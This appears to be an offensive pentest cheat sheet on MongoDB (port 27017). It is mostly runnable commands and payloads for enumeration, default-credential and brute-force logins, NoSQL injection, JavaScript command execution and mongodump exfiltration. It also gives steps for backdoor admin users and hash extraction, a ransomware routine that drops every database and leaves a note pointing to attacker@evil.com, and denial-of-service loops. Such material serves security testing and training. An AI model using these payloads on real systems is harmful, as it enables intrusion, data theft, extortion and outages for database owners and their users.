# MongoDB 27017

**`Default Ports: 27017, 27018`**

**MongoDB** is a popular open-source NoSQL database that uses a document-oriented data model. Unlike traditional relational databases, MongoDB stores data in flexible, JSON-like documents called BSON (Binary JSON). This makes it highly scalable and perfect for handling large volumes of unstructured or semi-structured data. MongoDB is widely used in modern web applications, big data, real-time analytics, and content management systems.

### Connect <a href="#connect" id="connect"></a>

#### Connect Using mongo Shell <a href="#connect-using-mongo-shell" id="connect-using-mongo-shell"></a>

```
mongo <target-ip>:<port>
```

#### Connect Using mongosh (Modern Shell) <a href="#connect-using-mongosh-modern-shell" id="connect-using-mongosh-modern-shell"></a>

```
mongosh "mongodb://<target-ip>:<port>"
```

### Recon <a href="#recon" id="recon"></a>

#### Identifying a MongoDB Server <a href="#identifying-a-mongodb-server" id="identifying-a-mongodb-server"></a>

You can use `Nmap` to check if there's a MongoDB server on a target host like this:

```
nmap -p 27017,27018 target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

You can use `Netcat` to find out if a MongoDB service is running and its version by looking at the welcome message it shows when you connect. This method is called Banner Grabbing.

```
nc -vn target.com 27017
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Automated Enumeration with Nmap <a href="#automated-enumeration-with-nmap" id="automated-enumeration-with-nmap"></a>

Use `mongodb-info` script to gather detailed server information:

```
nmap -p 27017 --script mongodb-info target.com
```

Use `mongodb-databases` script to list databases without authentication:

```
nmap -p 27017 --script mongodb-databases target.com
```

#### Enumeration with Metasploit <a href="#enumeration-with-metasploit" id="enumeration-with-metasploit"></a>

```
use auxiliary/scanner/mongodb/mongodb_info
set RHOSTS target.com
run
```

```
use auxiliary/scanner/mongodb/mongodb_enum
set RHOSTS target.com
run
```

#### Manual Enumeration via MongoDB Shell <a href="#manual-enumeration-via-mongodb-shell" id="manual-enumeration-via-mongodb-shell"></a>

```
db.version()
db.serverStatus()
db.serverBuildInfo()
db.hostInfo()
db.adminCommand({getCmdLineOpts: 1})
```

```
// List all databases
show dbs
db.adminCommand('listDatabases')

// Switch to database
use database_name

// List collections
show collections
db.getCollectionNames()

// Collection statistics
db.collection_name.stats()
db.collection_name.count()
```

```
// List users (requires admin)
use admin
db.system.users.find()
db.getUsers()

// Current user
db.runCommand({connectionStatus: 1})

// User roles
db.getRoles({showBuiltinRoles: true})

// All users across databases
db.adminCommand({usersInfo: {forAllDBs: true}})
```

```
// Get all configuration
db.adminCommand({getParameter: '*'})

// Authentication mechanisms
db.adminCommand({getParameter: 1, authenticationMechanisms: 1})

// Network settings
db.adminCommand({getParameter: 1, bindIp: 1})
db.adminCommand({getParameter: 1, port: 1})

// Check if authentication is enabled
db.adminCommand({getCmdLineOpts: 1}).parsed.security
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### No Authentication <a href="#no-authentication" id="no-authentication"></a>

MongoDB instances can be configured without authentication, allowing anyone to connect and access all databases and collections. This is a critical security misconfiguration that exposes sensitive data to unauthorized users. The attacker can read, modify, or delete data without providing any credentials.

```
# Test if authentication required
mongo target.com:27017

# If connection succeeds without credentials
# MongoDB is misconfigured (no auth)
```

```
mongo target.com:27017 --eval "db.adminCommand('listDatabases')"
```

```
mongo target.com:27017/database_name --eval "db.collection.find()"
```

#### Default Credentials <a href="#default-credentials" id="default-credentials"></a>

Many MongoDB installations use weak default credentials that are easily guessable or well-known. These credentials are often left unchanged by administrators, making them prime targets for attackers. Default credentials provide immediate access to the database without requiring complex brute force attacks.

```
# Common default credentials
admin:admin
admin:password
root:root
mongodb:mongodb
user:user

# Try connection
mongo -u admin -p admin target.com/admin
mongo -u root -p password target.com
```

#### Brute Force Attack <a href="#brute-force-attack" id="brute-force-attack"></a>

A brute-force attack involves trying many passwords or usernames to find the right one for accessing a system.

Tools like Hydra are designed for cracking into networks and can be used on services like MongoDB, MySQL, PostgreSQL, etc. For MongoDB, Hydra often carries out a dictionary attack, which means it uses a list of possible usernames and passwords from a file to try and log in.

**Brute Forcing with Hydra**

To use `Hydra` for brute-forcing MongoDB login credentials, you would use a command structured for this purpose:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com mongodb
```

**Brute Forcing with Nmap**

It is also possible to perform brute force on MongoDB with `Nmap` scripts:

```
nmap -p 27017 --script mongodb-brute target.com
```

**Brute Forcing with Metasploit**

It is also possible to apply brute force with `Metasploit` modules on MongoDB:

```
use auxiliary/scanner/mongodb/mongodb_login
set RHOSTS target.com
set USERNAME admin
set PASS_FILE passwords.txt
run
```

**Brute Forcing with Custom Script**

```
for pass in $(cat passwords.txt); do
    mongo "mongodb://admin:$pass@target.com:27017/admin" --eval "db.version()" && echo "[+] Found: admin:$pass"
done
```

#### NoSQL Injection <a href="#nosql-injection" id="nosql-injection"></a>

NoSQL injection attacks exploit vulnerabilities in MongoDB query construction, allowing attackers to bypass authentication or extract sensitive data. These attacks leverage MongoDB's flexible query operators and JavaScript execution capabilities to manipulate query logic. NoSQL injection can be more dangerous than traditional SQL injection due to the dynamic nature of NoSQL queries.

```
// In login forms with MongoDB queries
username[$ne]=null&password[$ne]=null
{"username": {"$ne": null}, "password": {"$ne": null}}
```

```
{"username": {"$in": ["admin", "user"]}, "password": {"$ne": null}}
```

```
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}
```

```
{"username": "admin", "password": {"$where": "this.password.match(/.*/);"}}
```

```
' || '1'=='1
' || 1==1//
' || 1==1%00
admin' || '1'=='1
{"$gt": ""}
{"$ne": ""}
{"$nin": []}
username[$nin][]=invalid&password[$ne]=null
```

#### Arbitrary JavaScript Execution <a href="#arbitrary-javascript-execution" id="arbitrary-javascript-execution"></a>

MongoDB allows execution of JavaScript code through various operators, which can be exploited to perform arbitrary code execution on the server. This vulnerability occurs when user input is directly passed to JavaScript execution contexts without proper sanitization. Attackers can leverage this to execute system commands, access the file system, or perform other malicious operations.

```
db.collection.find({$where: "sleep(5000) || true"})
```

```
db.collection.find({$where: function() {
    var cmd = "whoami";
    var output = run("bash", "-c", cmd);
    return true;
}})
```

```
db.collection.mapReduce(
    function() { emit(this._id, this); },
    function(key, values) { 
        // Malicious code
        return "pwned";
    },
    {out: {inline: 1}}
)
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Search for Sensitive Data <a href="#search-for-sensitive-data" id="search-for-sensitive-data"></a>

After gaining access to MongoDB, search for sensitive information including user credentials, API keys, tokens, and personal data stored in collections.

**Find Collections with Sensitive Names**

Look for collections that might contain sensitive information based on their names:

```
db.getCollectionNames().filter(c => 
    c.match(/user|password|credential|token|key|secret|admin/i)
)
```

**Search Documents for Credentials**

```
db.users.find({}, {password: 1, email: 1, token: 1})
db.config.find({}, {api_key: 1, secret: 1, password: 1})
```

**Sample Documents from All Collections**

Examine sample documents from all available collections to understand the data structure:

```
db.getCollectionNames().forEach(function(c) {
    print("Collection: " + c);
    printjson(db[c].findOne());
})
```

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Extract sensitive information from the compromised MongoDB instance using tools like `mongodump` and `mongoexport`.

**Export Entire Database**

Use `mongodump` to create a complete backup of the MongoDB instance:

```
mongodump --host target.com --port 27017 --out /tmp/dump
```

**Export with Authentication**

```
mongodump --host target.com --port 27017 \
    --username admin --password password \
    --authenticationDatabase admin \
    --out /tmp/dump
```

**Export Specific Database**

```
mongodump --host target.com --db database_name --out /tmp/dump
```

**Export Specific Collection**

```
mongodump --host target.com --db database_name --collection users --out /tmp/dump
```

**Export to CSV**

```
mongoexport --host target.com --db database_name --collection users \
    --type=csv --fields name,email,password --out users.csv
```

**Query and Save Data**

```
mongo target.com/database_name --eval "db.users.find()" > users_data.json
```

#### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Gain administrative privileges by creating new admin users or modifying existing user roles.

**Create Admin User**

```
use admin
db.createUser({
    user: "backdoor",
    pwd: "P@ssw0rd123!",
    roles: [{role: "root", db: "admin"}]
})
```

**Grant Roles to Existing User**

```
db.grantRolesToUser("existing_user", [{role: "root", db: "admin"}])
```

**Modify User Password**

```
db.changeUserPassword("username", "newpassword")
```

**Update User Roles Directly**

```
// Requires admin
db.system.users.update(
    {user: "username"},
    {$set: {roles: [{role: "root", db: "admin"}]}}
)
```

#### Persistence <a href="#persistence" id="persistence"></a>

Maintain long-term access through backdoor admin accounts and hidden collections.

**Create Backdoor Admin User**

```
use admin
db.createUser({
    user: "system_service",
    pwd: "ComplexBackdoor123!",
    roles: [
        {role: "root", db: "admin"},
        {role: "userAdminAnyDatabase", db: "admin"}
    ]
})
```

**Create Hidden Collection for C2**

```
use admin
db.createCollection(".system_config")
db[".system_config"].insert({cmd: "whoami", output: ""})
```

**Store Backdoor JavaScript Function**

```
db.system.js.save({
    _id: "backdoor_function",
    value: function() {
        // Backdoor code
        return "OK";
    }
})
```

#### Command Execution <a href="#command-execution" id="command-execution"></a>

Execute system commands directly from the MongoDB shell using `eval` and `$where` operators (deprecated in newer versions).

**Check if JavaScript Execution Enabled**

```
db.adminCommand({getParameter: 1, javascriptEnabled: 1})
```

**Execute System Commands**

```
// Requires special configuration
db.runCommand({
    eval: "function() { return run('whoami'); }",
    nolock: true
})
```

**Using $where for Command Execution**

```
// Deprecated but might work
db.collection.find({$where: "return shellHelper.run('whoami')"})
```

#### Password Hash Extraction <a href="#password-hash-extraction" id="password-hash-extraction"></a>

Extract password hashes from the user collection for offline cracking with tools like `hashcat` or `john`.

**Extract User Hashes**

```
// Requires admin access
use admin
db.system.users.find()
```

**Format Hashes for Cracking**

```
db.system.users.find().forEach(function(u) {
    print(u.user + ":" + u.credentials["SCRAM-SHA-1"].storedKey);
})
```

**Export to File**

```
mongoexport --host target.com --db admin --collection system.users \
    --username admin --password password \
    --out user_hashes.json
```

#### Database Ransomware <a href="#database-ransomware" id="database-ransomware"></a>

Database ransomware attacks involve encrypting or deleting database contents and demanding payment for restoration. This malicious activity can cause significant business disruption and data loss.

The attack typically involves backing up the original data, dropping or encrypting databases, and leaving ransom notes with payment instructions. These attacks exploit administrative access to cause maximum damage and financial impact.

**Backup Original Data**

```
mongodump --host target.com --out /tmp/stolen_backup
```

**Drop All Databases**

```
db.adminCommand('listDatabases').databases.forEach(function(d) {
    if (d.name != 'admin' && d.name != 'local') {
        db.getSiblingDB(d.name).dropDatabase();
    }
})
```

**Create Ransom Note**

```
use admin
db.RANSOM_NOTE.insert({
    message: "Your databases have been encrypted. Send 1 BTC to...",
    bitcoin_address: "1ABC...",
    contact: "mailto:attacker@evil.com"
})
```

#### Denial of Service <a href="#denial-of-service" id="denial-of-service"></a>

Denial of Service (DoS) attacks against MongoDB aim to exhaust server resources and make the database unavailable to legitimate users. These attacks can be performed through resource-intensive queries, massive data insertion, or destructive operations.

Common DoS techniques include slow query attacks using `$where` operators, creating excessive indexes, inserting large documents, or dropping entire databases. These attacks can cause significant downtime and business disruption.

**Slow Query Attack**

```
db.collection.find({$where: "sleep(10000) || true"})
```

**Create Massive Indexes**

```
for (var i = 0; i < 1000; i++) {
    db.collection.createIndex({field: i});
}
```

**Insert Large Documents**

```
for (var i = 0; i < 1000000; i++) {
    db.collection.insert({data: "A".repeat(10000)});
}
```

**Drop All Databases**

```
db.adminCommand('listDatabases').databases.forEach(function(d) {
    db.getSiblingDB(d.name).dropDatabase();
})
```

#### Lateral Movement <a href="#lateral-movement" id="lateral-movement"></a>

Lateral movement involves using compromised MongoDB access to discover and access other systems within the network. This technique helps attackers expand their foothold and access additional resources.

The process typically involves extracting connection strings, searching for credentials stored in collections, and analyzing database queries to identify other connected systems. This information can be used to pivot to other databases, applications, or network services.

**Extract Connection Strings**

```
db.config.find()
db.settings.find()
```

**Search for Credentials in Collections**

```
db.users.find({}, {password: 1, email: 1})
db.config.find({}, {api_key: 1, secret: 1})
```

**Check Database Queries for Connections**

```
db.system.profile.find({op: "query"}).forEach(function(doc) {
    printjson(doc);
})
```

### Common MongoDB Commands <a href="#common-mongodb-commands" id="common-mongodb-commands"></a>

| Command                  | Description      | Usage                                             |
| ------------------------ | ---------------- | ------------------------------------------------- |
| `show dbs`               | List databases   | `show dbs`                                        |
| `use db`                 | Switch database  | `use mydb`                                        |
| `show collections`       | List collections | `show collections`                                |
| `db.collection.find()`   | Query documents  | `db.users.find()`                                 |
| `db.collection.insert()` | Insert document  | `db.users.insert({name:"test"})`                  |
| `db.collection.update()` | Update document  | `db.users.update({name:"test"}, {$set:{age:25}})` |
| `db.collection.remove()` | Delete document  | `db.users.remove({name:"test"})`                  |
| `db.collection.drop()`   | Drop collection  | `db.users.drop()`                                 |
| `db.dropDatabase()`      | Drop database    | `db.dropDatabase()`                               |
| `db.createUser()`        | Create user      | `db.createUser({user:"admin",pwd:"pass"})`        |
| `db.getUsers()`          | List users       | `db.getUsers()`                                   |

### NoSQL Injection Payloads <a href="#nosql-injection-payloads" id="nosql-injection-payloads"></a>

```
// Authentication bypass
{"$ne": null}
{"$ne": ""}
{"$gt": ""}
{"$regex": ".*"}
{"$exists": true}

// OR operator
{"$or": [{"username": "admin"}, {"username": "user"}]}

// IN operator
{"$in": ["admin", "user", "root"]}

// NIN operator (not in)
{"$nin": ["invalid"]}

// WHERE operator
{"$where": "1==1"}
{"$where": "sleep(5000)"}

// Regex
{"$regex": "^admin"}
{"$regex": ".*"}

// Array manipulation
{"$elemMatch": {"$ne": null}}
```

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool            | Description            | Primary Use Case        |
| --------------- | ---------------------- | ----------------------- |
| mongo           | MongoDB shell          | Database interaction    |
| mongosh         | Modern MongoDB shell   | Enhanced shell          |
| mongodump       | Database backup        | Data exfiltration       |
| mongoexport     | Export data            | Data extraction         |
| MongoDB Compass | GUI client             | Visual management       |
| NoSQLMap        | NoSQL injection tool   | Automated exploitation  |
| Metasploit      | Exploitation framework | Automated testing       |
| Burp Suite      | Web proxy              | NoSQL injection testing |

### Security Misconfigurations <a href="#security-misconfigurations" id="security-misconfigurations"></a>

* ❌ No authentication enabled
* ❌ Default credentials
* ❌ Exposed to internet without firewall
* ❌ Bind to 0.0.0.0 instead of localhost
* ❌ JavaScript execution enabled
* ❌ No SSL/TLS encryption
* ❌ Weak passwords
* ❌ Excessive user privileges
* ❌ No role-based access control
* ❌ Logging disabled
* ❌ Outdated MongoDB version
* ❌ No regular backups
* ❌ Default port (27017) exposed

<br>
